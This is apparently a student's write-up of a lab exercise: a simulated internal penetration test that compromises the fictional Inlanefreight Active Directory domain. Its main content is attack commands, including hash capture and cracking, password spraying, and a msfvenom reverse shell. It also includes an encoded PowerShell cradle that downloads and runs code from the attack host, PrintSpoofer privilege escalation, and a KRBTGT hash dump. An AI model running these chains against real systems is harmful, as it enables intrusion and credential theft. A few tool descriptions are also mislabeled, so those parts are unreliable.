
## Scenario

Our client Inlanefreight has contracted us again to perform a full-scope internal penetration test. The client is looking to find and remediate as many flaws as possible before going through a merger & acquisition process. The new CISO is particularly worried about more nuanced AD security flaws that may have gone unnoticed during previous penetration tests. The client is not concerned about stealth/evasive tactics and has also provided us with a Parrot Linux VM within the internal network to get the best possible coverage of all angles of the network and the Active Directory environment. Connect to the internal attack host via SSH (you can also connect to it using `xfreerdp` as shown in the beginning of this module) and begin looking for a foothold into the domain. Once you have a foothold, enumerate the domain and look for flaws that can be utilized to move laterally, escalate privileges, and achieve domain compromise.

----
## Recon

To obtain a **NTLM** hash i used the **responder** tool
```bash
responder -I ens24 -wrf
```

- `-I`: indicate which network interface we'll be use
- `-w`: Start the WPAD rogue proxy server. Default value is Upstream HTTP proxy used by the rogue WPAD Proxy for outgoing requests (format: host:port)
- `-r`: Enable answers for **netbios** wredir suffix queries. Answering to wredir will likely break stuff on the network. Default: False
- `-f`: `--fingerprint` This option allows you to fingerprint a host that
- `-v`: Increase verbosity of log

![[Pasted image 20250517150618.png]]

In this case we achieve the NTLMv2 hash of **AB920** user for **172.16.7.3** client.
Now i try to crack this NTLMv2 hash using netcat with module `5600`
```bash
sudo hashcat -m 5600 NTLM_hash /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20250517151010.png]]
Now i have this credential

| **Client** | **User** | **Password** |
| ---------- | -------- | ------------ |
| 172.16.7.3 | AB920    | weasal       |

Using nmap i try to enumerate entire subnet
```bash
nmap -A 172.16.7.0/24 -Ao nmap_scan
```

I found three IP 
```text
172.16.7.3  DC01
172.16.7.50 MS01
172.16.7.60 SQL01
```

-----
## Foothold

I need to access in the `MS01` server (172.16.7.50). Enumerating more deep the 172.16.7.50 ip i found two method to try the foothold.
1) The `3389` port is open this means we can try to access in the server with `RDP` protocol
```bash
export DISPLAY=:0
ssh -X user@remote_host
xfreerdp /u:AB920 /p:weasal /v:172.16.7.50 /dynamic-resolution
```

2) The `5985` port is open this means we can try to access in the server with `winrm` protocol
```bash
crackmapexec winrm -u AB920 -p weasal -d INLANEFREIGHT 172.16.7.50
```

----
## Password Spray Attack

Download the `Kerbrute` and `PowerView.ps1` tools in the attack machine
```bash
wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe
```

Now i need to copy this tool in the machine where i have the SSH session.
```bash
scp PowerView.ps1 htb-student@10.129.73.75:/home/htb-student/Desktop
scp kerbrute_windows_amd64.exe htb-student@10.129.73.75:/home/htb-student/Desktop
```

To transfer this tools in the `MS01` machine we can use the shared folder in the machine. To crate the shared folder on the victim machine use 
```shell
xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /drive:share,/home/htb-student/Desktop
```

![[Pasted image 20250519000719.png]]

I started the meterpreter shell to have more stable sessions on the compromise machine
1) Create a meterpreter shell `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=4466 -f exe > meterpreter_shell.exe`
2) Use the `multi/handler` module
3) Connect with RDP using `xfreerdp` and `/drive:share` flag
4) Copy the .exe file on the desktop of victim machine
5) Start the .exe file
![[Pasted image 20250519001250.png]]

Now using `PowerView` i need to crate a valid users list

```powershell
cd .\Desktop\
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\PowerView.ps1
Get-DomainUser * | Select-Object -ExpandProperty samaccountname | Foreach {$_.TrimEnd()} |Set-Content adusers.txt
Get-Content .\adusers.txt | select -First 10
```

![[Pasted image 20250519002018.png]]

Using `kerbrute` i preform the passwordSpray attack with `Welcome1` stupid password

```bash
.\kerbrute_windows_amd64.exe passwordspray -d INLANEFREIGHT.LOCAL .\adUsers.txt Welcome1
```

![[Pasted image 20250519002429.png]]


| User  | Password |
| ----- | -------- |
| BR086 | Welcome1 |

---
## Privilege Escalation

First all i need to put the `Snaffler.exe` tool on the victim machine. I can use the same technique used with `Kerbrute`
```shell
wget -q https://github.com/SnaffCon/Snaffler/releases/download/1.0.16/Snaffler.exe

scp Snaffler.exe htb-student@10.129.73.75:/home/htb-student/Desktop
```

![[Pasted image 20250519003745.png]]

Now i try to run **Snaffler** as new user founded `BR086` i can achieve this with `runas` on powershell

```powershell
runas /netonly /user:INLANEFREIGHT\BR086 powershell
```


Now that i have impersonate the `BR086` can i launch the `snaffler` exe

![[Pasted image 20250519012921.png]]


| user  | password         |
| ----- | ---------------- |
| netdb | D@ta_bAse_adm1n! |

With this credential is possible access to the `172.16.7.60` SQL server machine. In this case i used the `mssqlclient.py` tool
```bash
mssqlclient.py INLANEFREIGHT/netdb:D@ta_bAse_adm1n\!@172.16.7.60
```

using the `whomai /priv` command is possible to visualize all privilege. In this case we can **escalate privilege** trough **SeImpersonatePrivilage** with [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe).
![[Pasted image 20250519013904.png]]

Firs all download and copy on attack machine
```bash
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

scp PrintSpoofer64.exe htb-student@STMIP:/home/htb-student/Desktop

```

now activate the `python3 -m http.server` on the ssh attack machine and download on the `SQL01` machine with the following command
```bash
xp_cmdshell certutil -urlcache -split -f "http://172.16.7.240:9000/PrintSpoofer64.exe" c:\windows\temp\PrintSpoofer64.exe
```

![[Pasted image 20250519014508.png]]

now i change the password for **Administrator** account in to `Welcome1`.

```sql
xp_cmdshell windows\temp\PrintSpoofer64.exe -c "net user administrator Welcome1"
```

![[Pasted image 20250519014658.png]]

now using `smbclient` can i access as local user administrator and get the flag

```bash
smbclient -U administrator \\\\172.16.7.60\\C$
```

![[Pasted image 20250519015347.png]]

or using `crackmapexec` with `--local-auth` flag

```bash
crackmapexec smb 172.16.7.60 -u administrator -p Welcome1 --local-auth --get-file 'Users\Administrator\Desktop\flag.txt' flag2.txt
```

![[Pasted image 20250519020119.png]]

Using msfconsole with `web_delivery` module i have create a PowerShell meterpreter shell
![[Pasted image 20250519224425.png]]
Once do that i execute this payload in the `SQL01` target machine trough PrintSpoofer64 to have a administrator shell

```bash
xp_cmdshell C:\windows\temp\PrintSpoofer64.exe -c "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB2AE4ATQA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsAaQBmACgAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUAByAG8AeAB5AF0AOgA6AEcAZQB0AEQAZQBmAGEAdQBsAHQAUAByAG8AeAB5ACgAKQAuAGEAZABkAHIAZQBzAHMAIAAtAG4AZQAgACQAbgB1AGwAbAApAHsAJAB2AE4ATQAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAkAHYATgBNAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADYALgA3AC4AMgA0ADAAOgA4ADAAOAAwAC8AbgBhADEAVAA1ADQAZwAwAHYAOAAvADYAYgBzAEMARQBnAFgAbwBTAHgASABjAFMAZQBXACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADcALgAyADQAMAA6ADgAMAA4ADAALwBuAGEAMQBUADUANABnADAAdgA4ACcAKQApADsA"
output     
```

![[Pasted image 20250519224606.png]]


![[Pasted image 20250519231217.png]]

Credentials founded

The same thing but using `Crackmapexec` 

![[Pasted image 20250519233121.png]]

| user     | password                 |
| -------- | ------------------------ |
| mssqlsvc | Sup3rS3cur3maY5ql$3rverE |

retrieve the flag on the Administrator desktop of `DC01`

```bash
crackmapexec smb 172.16.7.50 -u mssqlsvc -p 'Sup3rS3cur3maY5ql$3rverE' -d INLANEFREIGHT --get-file 'Users\Administrator\Desktop\flag.txt' flag.txt
```

----

Download and transfer `Inveigh` on `MS01`

```bash
wget -q https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1 && scp Inveigh.ps1 htb-student@STMIP:/home/htb-student/Desktop
```

Import the module
```bash
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\Inveigh.ps1
```

run the Invoke-Inveigh
```bash
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

- `-NBNS`: Enable spoofing NBNS (NetBios Name Service), respond to the request tricky the server to respond us.

![[Pasted image 20250520002127.png]]

```hash
CT059::INLANEFREIGHT:2f1040e798e80f65:a774eeaf280d92f7034a7098b6ba18c5:0101000000000000b1ea03500cc9db01cb29d99e5a8810660000000002001a0049004e004c0041004e0045004600520045004900470048005400010008004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00030030004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0007000800b1ea03500cc9db01060004000200000008003000300000000000000000000000002000006ff8eaf7d447a25d5ecdfb36d7c7427c37423c781a2b91271944adf19311d2820a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0037002e0035003000000000000000000000000000
```

Now i crack this with `hashcat`

```bash
hashcat -m 5600 NTLMv2_hash /usr/share/wordlists/rockyou.txt
```

| User  | Password |
| ----- | -------- |
| CT059 | charlie1 |

----
As bloodhunt explain the CT059 have the `GenericAll` over `Domain Admins` group
![[Pasted image 20250520004617.png]]

Connect on `MS01` with CT059 user
```bash
xfreerdp /v:172.16.7.50 /u:CT059 /p:charlie1
```

Now use this command to change the password of administrator account in `Domain Admins` group
```bash
net user administrator Welcome1 /domain
```

Now i have access on 172.16.7.3 `DC01` server
```bash
crackmapexec smb 172.16.7.3 -u Administrator -p Welcome1 -d INLANEFREIGHT  --get-file "\Users\Administrator\Desktop\flag.txt" flag_dc01.txt
```

![[Pasted image 20250520010018.png]]
Now i can perform `kerberoast` attack over KRBTGT using `secretsdump.py`
```bash
secretsdump.py INLANEFREIGHT/Administrator@172.16.7.3 -just-dc-user KRBTGT
```


| user   | hash                                                                            |
| ------ | ------------------------------------------------------------------------------- |
| KRBTGT | krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7eba70412d81c1cd030d72a3e8dbe05f::: |
